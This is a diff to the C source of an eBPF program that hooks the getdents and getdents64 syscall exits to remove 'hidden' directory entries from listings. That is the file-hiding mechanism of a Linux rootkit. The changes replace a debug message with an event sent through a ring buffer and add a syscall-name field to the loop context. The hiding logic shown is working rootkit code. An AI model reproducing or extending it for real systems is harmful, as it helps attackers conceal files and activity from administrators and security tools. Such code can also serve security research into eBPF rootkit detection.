@@ -11,6 +11,9 @@
 #include "../includes/bpf_common.h"
 #include "../includes/bpf_structs.h"
 #include "../includes/bpf_debug.h"
+#include "../includes/bpf_events_handler.h"
+#include "../data/bpf_events.h"
+#include "../data/bpf_ringbuf.h"
 #include "../lib/ftlib.h"
 
 //----------------------------------------------------
@@ -28,10 +31,11 @@
  * Stored the persistent state between iterations.
  */
 typedef struct getdents_loop_ctx {
+    char   syscall_name[64];
     struct linux_dirent64 *dirp;
     struct linux_dirent64 *last; //last valid.
-    __u64 curr_offset;
-    long ret;
+    __u64  curr_offset;
+    long   ret;
 } getdents_loop_ctx;
 
 /**
@@ -89,7 +93,10 @@ static long __process_dirent_entry(__u32 index, void *data)
     }
 
     if(hidden && *hidden == 1){
-        PRINT_DEBUG("Found result to hide for d_name => %s. Hiding it...", d_name);
+        char event_str[128];
+        BPF_SNPRINTF(event_str, sizeof(event_str), "Hooked d_name => %s.", d_name);
+
+        send_event(EVENT_TRIGGERED, lctx->syscall_name, event_str);
 
         if(lctx->last != NULL){
             __u16 last_reclen = 0;
@@ -175,10 +182,11 @@ int tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx)
 
     //preparing bpf_loop ctx.
     struct getdents_loop_ctx lctx = {
-        .dirp        = dirp,
-        .last        = NULL,
-        .curr_offset = 0,
-        .ret         = ret
+        .syscall_name = "__x64_sys_getdents64",
+        .dirp         = dirp,
+        .last         = NULL,
+        .curr_offset  = 0,
+        .ret          = ret
     };
 
     long nr_completed = bpf_loop(MAX_DIR_ITER_LOOP, __process_dirent_entry, &lctx, 0);
@@ -216,10 +224,11 @@ int tp_sys_exit_getdents(struct sys_getdents_exit_ctx *ctx)
 
     //preparing bpf_loop ctx.
     struct getdents_loop_ctx lctx = {
-        .dirp        = dirp,
-        .last        = NULL,
-        .curr_offset = 0,
-        .ret         = ret
+        .syscall_name = "__x64_sys_getdents",
+        .dirp         = dirp,
+        .last         = NULL,
+        .curr_offset  = 0,
+        .ret          = ret
     };
 
     long nr_completed = bpf_loop(MAX_DIR_ITER_LOOP, __process_dirent_entry, &lctx, 0);
